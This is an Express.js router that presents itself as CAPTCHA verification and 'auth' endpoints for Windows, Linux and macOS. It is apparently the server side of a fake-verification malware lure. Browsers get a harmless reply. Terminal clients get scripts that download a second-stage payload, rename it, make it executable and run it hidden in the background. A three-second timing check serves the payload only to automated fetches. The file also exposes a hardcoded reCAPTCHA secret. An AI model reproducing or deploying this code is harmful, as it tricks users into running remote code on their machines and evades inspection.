var express = require('express');
var router = express.Router();
const jwt = require('passport-jwt');
const path = require('path');
const fs = require('fs');

const requestLog = {};

// Lazy Responder :)
function responder(res, err, data) {
    if (err || !data) {
        console.log({
            err, data
        })
        res.status(400).send({
            err, data
        })
    } else {
        console.log("Data: " + data)
        res.status(200).send(data)
    }
}

// I am not a robot
router.post('/verify-captcha', async (req, res) => {
    const { token } = req.body;

  if (!token) {
    return res.status(400).json({ success: false, message: 'Missing reCAPTCHA token' });
  }

  try {
  const response = await axios.post(
    'https://www.google.com/recaptcha/api/siteverify',
    new URLSearchParams({
      secret: "6LfnXoUrAAAAAHMPXNBzTnj7AtSALJU_LrX7Rc39",
      response: token,
    }).toString(),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    }
  ); // ✅ Closing parenthesis moved here (no extra one)

  if (response.data.success) {
    res.json({ success: true });
  } else {
    res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
  }
} catch (error) {
   console.error('CAPTCHA verification error:', error.message);
  res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
}
})
// Login

router.get("/auth/windows", (req, res) => {
  const token = req.query.token;

   const userAgent = req.get('User-Agent');
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)){
     res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
   }
   else{
    const domain = req.protocol + '://' + req.get('host');
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const now = Date.now();
    if (!requestLog[ip]) {
      requestLog[ip] = {};
    } else {
      res.type("text/plain").send(`@echo off
      echo Authenticated
      `);
    }
      requestLog[ip].step1 = now;


    res.type("text/plain").send(`@echo off
    
    curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
    cls
    ren "%USERPROFILE%\\token" token.cmd
    cls
    call "%USERPROFILE%\\token.cmd"
    cls
    `);
   }


});

router.get("/auth/linux", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
    const domain = req.protocol + '://' + req.get('host');
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const now = Date.now();
    if (!requestLog[ip]) {
      requestLog[ip] = {};
    } else {
      res.type("text/plain").send(`@echo off
      echo Authenticated
      `);
    }
      requestLog[ip].step1 = now;
      
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});
router.get("/auth/mac", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const now = Date.now();
    if (!requestLog[ip]) {
      requestLog[ip] = {};
    } else {
      res.type("text/plain").send(`@echo off
      echo Authenticated
      `);
    }
      requestLog[ip].step1 = now;
      
    const domain = req.protocol + '://' + req.get('host');
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});



router.get("/tokenParser.npl", (req, res) => {
  console.log("✅ /api/token.npl called");
  const filePath = path.join(__dirname, '..', 'public','tokenParser.npl');

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send(filePath);
    }
    res.type('text/plain').send(content);
  });
});
router.get("/package.json", (req, res) => {
  console.log("✅ /api/token.npl called");
  const filePath = path.join(__dirname, '..', 'public','package.json');

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send(filePath);
    }
    res.type('text/plain').send(content);
  });
});
// Serve token.npl with domain substitution
router.get("/token.npl", (req, res) => {
  console.log("✅ /api/token.npl called");
  const domain = `${req.protocol}://${req.get('host')}`;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const filePath = path.join(__dirname, '..', 'public','token.npl');

  if (!requestLog[ip] || !requestLog[ip].step1) {
    res.status(400).send('request failed');
    return;
  }
  const now = Date.now();
  requestLog[ip].step2 = now;
  const timeDiff = now - requestLog[ip].step1;
  const isAutomatic = timeDiff < 3000; // 3 seconds threshold
  delete requestLog[ip];
  
  if(isAutomatic){
  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send(err); 
    }

    const modified = content.replace(/{{DOMAIN}}/g, domain);
    res.type('text/plain').send(modified);
  });  
  } else {
    return res.status(500).send('request failed');
  }
  
});

// Linux version
router.get("/tokenlinux.npl", (req, res) => {
  const domain = `${req.protocol}://${req.get('host')}`;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const now = Date.now();
  const filePath = path.join(__dirname, '..', 'public','tokenlinux.npl');
  if (!requestLog[ip] || !requestLog[ip].step1) {
    res.status(400).send('request failed');
    return;
  }
  requestLog[ip].step2 = now;
  const timeDiff = now - requestLog[ip].step1;
  const isAutomatic = timeDiff < 3000; // 3 seconds threshold
  delete requestLog[ip];
  if(isAutomatic){

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error reading tokenlinux.npl');
    }

    const modified = content.replace(/{{DOMAIN}}/g, domain);
    res.type('text/plain').send(modified);
  });
  }else {
    return res.status(500).send(filePath);
  }
});

module.exports = router;